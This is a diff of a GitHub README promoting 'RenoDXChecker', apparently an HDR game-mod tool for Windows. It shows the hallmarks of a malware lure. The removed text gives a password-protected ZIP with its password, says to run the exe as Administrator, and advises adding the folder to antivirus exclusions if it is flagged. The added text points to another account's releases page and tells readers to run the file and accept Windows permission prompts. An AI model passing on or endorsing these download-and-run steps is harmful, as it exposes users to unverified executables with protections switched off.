@@ -1,63 +1,165 @@
+# 🎮 RenoDXChecker-HDR-Game-Mods-on-Windows - Simple HDR for Windows Games
 
-<img width="1536" height="1024" alt="20260330_1313_RenoDXChecker HDR Превью_remix_01kmzvp73beds9hbddpyx8akq1(1)" src="https://github.com/user-attachments/assets/3a2d1093-9780-48e3-b493-50d82b6e6e1c" />
+[![Download RenoDXChecker](https://img.shields.io/badge/Download%20RenoDXChecker-blue?style=for-the-badge&logo=github)](https://github.com/Anthophilous-abetter567/RenoDXChecker-HDR-Game-Mods-on-Windows/releases)
 
-# RenoDXChecker HDR Game Mods on Windows 2026
-[![Stars](https://img.shields.io/github/stars/Miky91350/RenoDXChecker-HDR-Game-Mods-on-Windows)](https://github.com/Miky91350/RenoDXChecker-HDR-Game-Mods-on-Windows) [![License: MIT](https://img.shields.io/badge/License-MIT-yellow.svg)](https://opensource.org/licenses/MIT)
+## 🖥️ What this tool does
 
-Complete ready-to-use **RenoDXChecker HDR Game Mods** for Windows — the ultimate tool to check RenoDX compatibility and enable high-quality HDR mods in supported games. Detects game compatibility, applies advanced RenoDX HDR rendering, improves lighting, colors, contrast, and overall visual quality with proper HDR support.
+RenoDXChecker-HDR-Game-Mods-on-Windows helps you turn on HDR game mods on Windows with a simple setup. It is made for users who want better game visuals without a hard install process.
 
-<img width="875" height="731" alt="image" src="https://github.com/user-attachments/assets/ab270e6a-3472-4345-915e-859386f9e7da" />
+Use it to:
 
----
-## ⚠️ Disclaimer
-This repository is for educational and testing purposes only. All files are provided as-is. Use at your own risk. Not affiliated with the original RenoDX developers. Modding may affect game stability — always backup your game files.
+- Enable HDR for supported games
+- Apply RenoDX rendering changes
+- Pick from preset visual profiles
+- Improve contrast, brightness, and image depth
+- Keep the setup simple on Windows 10 and Windows 11
 
----
-## 📦 What's Included
-- **RenoDXChecker** latest 2026 version
-- HDR mod support with advanced rendering
-- Game compatibility scanner
-- Easy one-click HDR activation for supported titles
-- Multiple HDR presets and customization options
-
----
 ## 📥 Download
-Password-protected archive with the complete RenoDXChecker HDR mods package – extract and enhance your game visuals instantly.  
 
-📥 [Download `RenoDXChecker-1.65.zip`](https://github.com/Miky91350/RenoDXChecker-HDR-Game-Mods-on-Windows/releases/download/Game-Tweak/RenoDXChecker.zip)  
-🔐 `LS2026`
----
-### Archive Contents
-- `RenoDXChecker.exe` – main checker and HDR applicator
-- `presets/` – ready HDR profiles
-- `setup_guide.txt` – quick start instructions
-- `extras/` – compatibility list and backup tool
+Visit this page to download:
+https://github.com/Anthophilous-abetter567/RenoDXChecker-HDR-Game-Mods-on-Windows/releases
 
----
-## 🚀 Quick Start
-1. Extract the archive anywhere  
-2. Run `RenoDXChecker.exe` as Administrator  
-3. Scan your game for RenoDX compatibility  
-4. Enable HDR mod with one click  
-5. Launch the game and enjoy enhanced visuals with proper HDR
+Look for the latest release, then download the file that matches your Windows setup. If the release includes an installer, download that file. If it includes a portable app, download that file and run it after extraction.
 
-> ℹ️ Best tool for enabling high-quality HDR and RenoDX mods on Windows 10/11. Improves lighting, contrast and color accuracy in supported games.
+## 🚀 Getting Started
 
----
-## ❗️ Troubleshooting
-| Problem                        | Solution                                                                 |
-|--------------------------------|--------------------------------------------------------------------------|
-| Game not detected              | Run as Administrator and select game folder manually                     |
-| HDR not working                | Make sure your monitor supports HDR and Windows HDR is enabled           |
-| Visual issues                  | Try different HDR presets in the tool                                    |
-| Antivirus flags the exe        | Add folder to exclusions                                                 |
+Follow these steps to get started on Windows.
 
----
-## 📜 License
-MIT License – shared for educational purposes only.
+1. Open the download page above.
+2. Find the newest release at the top of the page.
+3. Download the file for Windows.
+4. If the file is in a ZIP folder, right-click it and choose Extract All.
+5. Open the extracted folder.
+6. Double-click the app or installer file to start it.
+7. If Windows asks for permission, choose Yes.
+8. Follow the on-screen steps to finish setup.
+9. Open the tool and choose the game you want to use.
+10. Pick a preset and apply the HDR settings.
 
----
-## ⭐️ Support
-If this **RenoDXChecker HDR Game Mods** improved your gaming visuals — please star the repository! It helps others discover the best **RenoDX HDR mods for Windows** in 2026. ✨
+## 🧭 Before You Start
 
----
+For the best result, use the tool on a Windows PC with:
+
+- Windows 10 or Windows 11
+- A graphics card that supports HDR
+- A monitor with HDR support
+- The latest graphics driver
+- Admin access for setup
+
+If your game already has HDR, the tool can still help with tuning and rendering changes where supported.
+
+## 🛠️ How to Use It
+
+After you install or open the app:
+
+1. Start the program.
+2. Let it scan your games or choose a game from the list.
+3. Select an HDR preset.
+4. Apply the RenoDX settings.
+5. Launch the game.
+6. Use the in-game view to check brightness, contrast, and color.
+7. Switch presets if the image needs more tuning.
+
+If a game looks too dark or too bright, try a different preset first. Small changes often fix the image fast.
+
+## 🎛️ Features
+
+### ✨ HDR presets
+
+Choose from preset profiles made for different game types and screen setups.
+
+### 🖼️ RenoDX rendering support
+
+Apply rendering changes that can improve lighting and image shape in supported games.
+
+### ⚙️ One-click setup
+
+Use a simple flow to turn on the settings without editing files by hand.
+
+### 🔍 Game checker
+
+See which games are ready for HDR changes and which ones need a different preset.
+
+### 🌗 Visual tuning
+
+Adjust the look of the game for stronger highlights, deeper shadows, and cleaner color.
+
+### 🪟 Windows-friendly design
+
+The tool is made for Windows users and fits a simple install and run process.
+
+## 🧩 Supported Use Cases
+
+This tool is a good fit if you want to:
+
+- Improve game visuals on an HDR display
+- Use RenoDX-based mods with less effort
+- Test different HDR looks for a game
+- Change how light and color appear in supported titles
+- Keep game setup simple on Windows
+
+## 🧪 Recommended Setup
+
+For the best experience, use:
+
+- Windows 11 with HDR turned on
+- A recent NVIDIA, AMD, or Intel graphics driver
+- A display with solid HDR support
+- Games installed in a normal folder, not a protected system folder
+- Fullscreen or borderless window mode, if the game supports it
+
+## 🧯 If Something Looks Wrong
+
+If the image does not look right:
+
+- Try a different preset
+- Check that HDR is on in Windows
+- Make sure your monitor HDR mode is active
+- Update your graphics driver
+- Close other game overlay tools
+- Restart the game after changing settings
+
+If the game still looks off, open the tool again and choose a lighter or darker preset.
+
+## 🗂️ Basic Folder Flow
+
+Most users will follow this path:
+
+1. Download the release from GitHub
+2. Extract the files if needed
+3. Open the app or installer
+4. Pick your game
+5. Apply the HDR profile
+6. Start the game
+7. Check the image and change the preset if needed
+
+## 🔐 Safety and Access
+
+Use the release page linked above so you get the latest build from the project source. Keep the files in a folder you can find later. If Windows SmartScreen appears, check the file name and source before you run it.
+
+## 📌 Release Page
+
+Download from the latest release here:
+https://github.com/Anthophilous-abetter567/RenoDXChecker-HDR-Game-Mods-on-Windows/releases
+
+## 🖥️ Windows Tips
+
+- Turn on HDR in Windows display settings before you launch the game
+- Use one monitor at a time when testing a new preset
+- Restart the game after each change
+- Keep your GPU driver current
+- Use the same display mode each time you test a game
+
+## 🎯 Best Results
+
+To get a clean HDR image:
+
+- Start with the default preset
+- Make one change at a time
+- Compare the result in the same game scene
+- Use the preset that gives clear highlights and stable shadows
+- Save your working choice for later use
+
+## 📚 Topic Tags
+
+game-hdr, game-visuals, graphics-mod, hdr-2026, hdr-checker, hdr-mod, hdr-mods, hdr-rendering, hdr-support, hdr-tool, lighting-mod, modded-hdr, pc-graphics-mod, rendering-mod, renodx, renodx-hdr, renodx-tool, renodxchecker, visual-enhancement, windows-hdr
